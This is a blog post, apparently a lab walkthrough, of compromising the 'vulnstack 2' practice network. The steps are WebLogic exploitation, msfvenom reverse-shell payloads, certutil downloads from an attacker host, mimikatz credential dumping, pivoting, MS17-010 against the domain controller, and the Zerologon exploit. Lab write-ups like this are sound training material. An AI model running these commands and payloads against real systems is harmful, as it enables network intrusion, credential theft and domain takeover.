@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+        <head>
+        <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no" />
+        <meta charset="utf-8">
+        <title>vulnstack 2 | 老白</title>
+        <link rel="stylesheet" href="https://V-alkoinen.github.io/styles/main.css">
+        <link rel="stylesheet" href="https://at.alicdn.com/t/font_1306644_jwtuc2zzbrd.css">
+        <link href="https://cdn.bootcss.com/animate.css/3.7.2/animate.min.css" rel="stylesheet">
+         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+        <script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+         <script src="https://cdn.bootcss.com/highlight.js/9.15.10/highlight.min.js"></script>
+         <script >hljs.initHighlightingOnLoad();</script>
+
+    </head>
+    <body>
+              <header class="header mdui-m-b-5">      
+            <div class="container  ">
+                <div class="index-title animated fadeInDown mdui-text-center mdui-text-color-white mdui-m-b-2" style="animation-delay: 0.2s"><a href="https://V-alkoinen.github.io">老白</a></div>
+                <div class="mdui-text-color-white animated fadeInDown mdui-text-center  mdui-m-b-3" style="animation-delay: 0.4s"></div>
+           
+            <nav id="nav" class="mdui-text-center animated fadeInDown" style="animation-delay: 0.6s">
+                   
+                            <li><a href="/">首页</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/archives">归档</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                            <li><a href="/tags">标签</a>
+                                <span class="nav-style top"></span>
+                                <span class="nav-style bottom"></span>
+                                <span class="nav-style left"></span>
+                                <span class="nav-style right"></span>
+                                </li>
+                    
+                  </nav>
+                </div>
+        </header>
+        <div class="mdui-container ">
+                <div class="mdui-row">
+                        <div class="mdui-col-md-8 mdui-col-offset-md-2 ">
+                                <article class="mdui-p-a-2 post animated fadeIn" style="animation-delay: 0.8s;animation-duration: 2s">
+                                    <div class="post-title  mdui-m-b-1">vulnstack 2</div>
+                                    <div class="mdui-typo-body-2 mdui-m-b-2" datetime="2022-02-26 19:01:58">2022-02-26 / 3 min read</div>
+                                    <div class="mdui-m-b-2 mdui-typo post-neirong"><h1 id="环境">环境</h1>
+<p>web：172.16.70.142  10.10.10.80<br>
+pc：   172.16.70.143  10.10.10.201<br>
+dc：   10.10.10.10</p>
+<h1 id="过程">过程：</h1>
+<p> <code>nmap -T4 -Pn -sV -O 172.16.70.142</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132714799.png" alt="" loading="lazy"><br>
+ 发现142起了个weblogic，github上找个工具扫一下，查看是否有漏洞</p>
+<pre><code>git clone https://github.com/rabbitmask/WeblogicScan
+pip3 install -r requirements.txt
+python3 WeblogicScan.py -u 172.16.70.142 -p 7001
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646132789871.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132843309.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646132868347.png" alt="" loading="lazy"><br>
+ 发现版本为10.3.6.0</p>
+<pre><code>msfconsole
+search weblogic 10.3.6
+use 1
+set rhosts 172.16.70.142
+set lport 9999 
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133015955.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133021973.png" alt="" loading="lazy"><br>
+ 142 getshell，搞个meterperter【<a href="https://qftm.github.io/2019/08/03/Windows-Reverse-Shell/">参考</a>】<br>
+ <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.70.129 LPORT=9998 -f exe &gt; ./shell.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133152664.png" alt="" loading="lazy"><br>
+ <code>certutil.exe -urlcache -split -f http://192.16.70.129/shell.exe shell.exe</code>【<a href="https://www.cnblogs.com/lfoder/p/8241548.html">参考</a>】<br>
+<img src="https://V-alkoinen.github.io/post-images/1646133259291.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133265525.png" alt="" loading="lazy"></p>
+<pre><code>msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 9998
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133296178.png" alt="" loading="lazy"><br>
+ <code>./shell.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133377638.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133383888.png" alt="" loading="lazy"><br>
+ <code>Getsystem</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133432888.png" alt="" loading="lazy"></p>
+<pre><code>chcp 65001
+whoami
+ipconfig
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133462022.png" alt="" loading="lazy"><br>
+ 机器内部有两张网卡，一张是172.16.70.142 另一张是10.10.10.80，收集一波信息</p>
+<pre><code>nltest /dclist:
+net group “domain controllers” /doman
+net user /domain
+net group &quot;domain computers&quot; /domain
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133568830.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133575140.png" alt="" loading="lazy"><br>
+ 搞个<code>mimikatz</code><br>
+ <code>git clone https://github.com/gentilkiwi/mimikatz</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133640390.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133646811.png" alt="" loading="lazy"><br>
+ <code>certutil.exe -urlcache -split -f http://172.16.70.129/mimikatz.exe mimi.exe</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133683731.png" alt="" loading="lazy"></p>
+<pre><code>cd C:\Oracle\Middleware\user_projects\domains\base_domain
+Mimi.exe
+privilege::debug
+log
+sekurlsa::logonpasswords
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646133820260.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133828228.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133834664.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646133841082.png" alt="" loading="lazy"><br>
+ <code>此处说一下，我抓hash没发现域管的hash，但看了下网上的writeup都能抓到，我也不知道怎么抓的</code><br>
+ <a href="https://www.objectif-securite.ch/en/ophcrack">爆破hash</a><br>
+ 加路由</p>
+<pre><code>bg
+use post/multi/manage/autoroute
+set sission 1
+run
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1646134060731.png" alt="" loading="lazy"></figure>
+<pre><code>search ms17
+use 1
+set rhosts 10.10.10.10
+set lhost 10.10.10.80
+set lport 10001
+run
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646134099583.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134106311.png" alt="" loading="lazy"><br>
+ 迁移进程拿shell</p>
+<pre><code>Ps
+migrate 328
+shell
+chcp 65001
+whoami
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646134229400.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134235562.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134241846.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646134566286.png" alt="" loading="lazy"></p>
+<h1 id="试用下cve-2020-1472">试用下CVE-2020-1472</h1>
+<p> 可利用该漏洞将域控的计算机的机器账号密码置为控，此处指的是 dc$<br>
+ <a href="https://github.com/dirkjanm/CVE-2020-1472">CVE-2020-1472</a><br>
+ 先搞个socks（之前已经添加过route了）</p>
+<pre><code>search socks
+use 0
+run
+vim /etc/proxychains4.conf
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://V-alkoinen.github.io/post-images/1646139686405.png" alt="" loading="lazy"></figure>
+<pre><code>curl https://raw.githubusercontent.com/dirkjanm/CVE-2020-1472/master/cve-2020-1472-exploit.py &gt; 1.py
+python3 -m pip install impacket
+proxychains -q python3 1.py DC 10.10.10.10
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1646139693934.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646139699034.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1646139703868.png" alt="" loading="lazy"></p>
+</div>
+                                    <div class="mdui-divider mdui-m-b-2"></div>
+                                    <div class="mdui-row-xs-2 post-fenye">
+                                       
+                                        <div class="mdui-col"> </div>
+                                        
+
+                                        
+                                        <div class="mdui-col"><div class="mdui-text-right "><a href="https://V-alkoinen.github.io/post/clash-rce/">clash RCE</a></div> </div>
+                                       
+                                      </div>
+                                   
+                                    <div class="mdui-divider mdui-m-t-2 mdui-m-b-2"></div>
+                                    
+                                     <script src="https://V-alkoinen.github.io/media/scripts/Valine.min.js"></script>
+ <div class="comment"></div>
+
+<script>
+      new Valine({
+            el: '.comment',
+
+
+
+            path: window.location.pathname,
+            pageSize: 30,
+            avatar:'mm', 
+       })
+    </script> 
+<script>
+    if(window.location.hash){
+        var checkExist = setInterval(function() {
+           if ($(window.location.hash).length) {
+              $('html, body').animate({scrollTop: $(window.location.hash).offset().top-90}, 1000);
+              clearInterval(checkExist);
+           }
+        }, 100);
+    }
+</script>
+                                </article>
+
+                                    
+                        </div>
+                      </div>
+    
+                
+
+              </div>
+                    <footer class="footer mdui-m-t-5 mdui-text-center">
+               <nav class="social-links">
+                      <ul>
+                      
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      
+                           
+                      </ul>
+                    </nav>
+                    <div class="copyright">
+                      
+                  </div>
+                  
+              </footer>
+    </body>
+</html>
